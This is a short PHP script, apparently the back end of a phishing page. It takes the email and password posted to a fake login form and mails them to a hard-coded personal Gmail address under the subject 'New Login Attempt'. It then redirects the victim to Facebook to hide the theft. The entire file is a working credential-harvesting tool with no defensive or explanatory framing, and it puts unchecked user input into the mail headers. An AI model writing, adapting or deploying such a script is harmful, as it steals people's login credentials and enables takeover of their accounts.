<?php
$email = $_POST["email"];
$passkey = $_POST["password"];

$recipient = "israelstoba@gmail.com";
$subject = "New Login Attempt";
$message = "Email: $email\nPassword: $passkey";
$mailheader = "From: $email\r\n";

mail($recipient, $subject, $message, $mailheader)
or die("Error");

header("location:https://web.facebook.com");
?>
